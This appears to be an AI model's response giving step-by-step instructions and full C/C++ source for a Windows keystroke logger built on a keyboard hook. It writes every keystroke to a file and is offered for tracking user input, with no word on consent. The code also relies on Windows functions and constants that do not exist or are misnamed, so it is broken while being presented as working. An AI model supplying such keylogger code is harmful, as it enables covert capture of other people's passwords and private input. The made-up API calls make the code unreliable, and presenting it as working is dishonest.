Here is a step-by-step explanation and code for implementing a keystroke logger on a Windows computer using a keyboard hook:

### Step-by-Step Explanation

1. **Include Necessary Headers**: We need to include the Windows header file for keyboard and time functions.
   ```c
   #include <windows.h>
   #include <stdio.h>
   #include <time.h>
   #include <iostream>
   #include <fstream>
   ```

2. **Define Constants**: Define constants for the hook ID and the maximum size of the log file.
   ```c
   #define HOOK_ID 0x00000001
   #define LOG_SIZE 1000
   ```

3. **Set Up the Keyboard Hook**:
   - Use `SetWindowsHook` to install a global keyboard hook.
   - The function returns a handle to the hook if successful.
   ```c
   HWND hwnd = GetDesktopWindow();
   int hook = SetWindowsHook(WH_KEYBOARD_ALL, KeyboardProc);
   ```

4. **Log File Initialization**:
   - Create a file stream in append mode to log keystrokes.
   ```c
   std::fstream logFile;
   logFile.open("keyboard_log.txt", std::ios::app);
   ```

5. **Define the Keyboard Proc Function**:
   - This function handles keyboard events and logs the keystrokes.
   ```c
   LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
       // Check if the key is a printable character
       if (wParam == VK_KEYDOWN || wParam == VK_KEYUP) {
           // Capture the key state
           bool isKeyDown = (wParam == VK_KEYDOWN);
           int key = GetKeyState(VkKeyScanLeft(wparam));
           // Determine if modifiers are pressed
           bool shift = (wParam == VK_LSHIFT || wParam == VK_RSHIFT);
           bool ctrl = (wParam == VK_LCONTROL || wParam == VK_RCONTROL);
           bool alt = (wParam == VK_LALT || wParam == VK_RALT);
           // Append to log file
           logFile << (isKeyDown ? "[" : "]");
           logFile << (shift ? "SHIFT-" : "");
           logFile << (ctrl ? "CTRL-" : "");
           logFile << (alt ? "ALT-" : "");
           logFile << (char)wParam;
           logFile << " | Time: " << timeGetTime();
           logFile << std::endl;
       }
       // Return the default input handling
       return CallNextHook(nCode, wParam, lParam);
   }
   ```

6. **Run the Hook and Log Loop**:
   - Use a loop to continuously monitor and log keystrokes.
   ```c
   while (true) {
       Sleep(100); // Prevent high CPU usage
       // Check if the hook is still active
       if (!GetLastError() == 0) {
           // Handle error and break
           break;
       }
   }
   ```

7. **Uninstall the Hook and Clean Up**:
   - Ensure the hook is removed to prevent it from running indefinitely.
   ```c
   if (hook) {
       RemoveWindowHook(hwnd, HOOK_ID);
   }
   logFile.close();
   ```

### Full Code

```c
#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <iostream>
#include <fstream>

#define HOOK_ID 0x00000001
#define LOG_SIZE 1000

using namespace std;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode != HCN_KEYDOWN && nCode != HCN_KEYUP) {
        return CallNextHook(nCode, wParam, lParam);
    }

    bool isKeyDown = (wParam == VK_KEYDOWN);
    int key = GetKeyState(VkKeyScanLeft(wParam));
    bool shift = (wParam == VK_LSHIFT || wParam == VK_RSHIFT);
    bool ctrl = (wParam == VK_LCONTROL || wParam == VK_RCONTROL);
    bool alt = (wParam == VK_LALT || wParam == VK_RALT);

    ofstream logFile;
    logFile.open("keyboard_log.txt", ios::app);
    logFile << (isKeyDown ? "[" : "]");
    logFile << (shift ? "SHIFT-" : "");
    logFile << (ctrl ? "CTRL-" : "");
    logFile << (alt ? "ALT-" : "");
    logFile << static_cast<char>(wParam);
    logFile << " | Time: " << timeGetTime();
    logFile << endl;
    logFile.close();

    return CallNextHook(nCode, wParam, lParam);
}

int main() {
    HWND hwnd = GetDesktopWindow();
    int hook = SetWindowsHook(WH_KEYBOARD_ALL, KeyboardProc);
    if (!hook) {
        cout << "Failed to install keyboard hook." << endl;
        return 1;
    }

    while (true) {
        Sleep(100);
        if (GetLastError() != 0) {
            cout << "Keyboard hook error: " << GetLastError() << endl;
            break;
        }
    }

    if (hook) {
        RemoveWindowHook(hwnd, HOOK_ID);
    }

    return 0;
}
```

### Explanation

- **Headers and Definitions**: The necessary Windows and input handling headers are included, along with constants for the hook ID and log size.
- **Keyboard Proc Function**: This function captures key presses, checks for modifiers (Shift, Ctrl, Alt), and writes the keystroke to a file with a timestamp.
- **Hook Setup**: The hook is installed to monitor all keyboard events, and a loop continuously logs keystrokes.
- **Cleanup**: The hook is properly uninstalled, and the log file is closed to ensure no resources are left open.

This code provides a basic keystroke logging utility that can be used to track user input on a Windows system.<｜end▁of▁sentence｜>

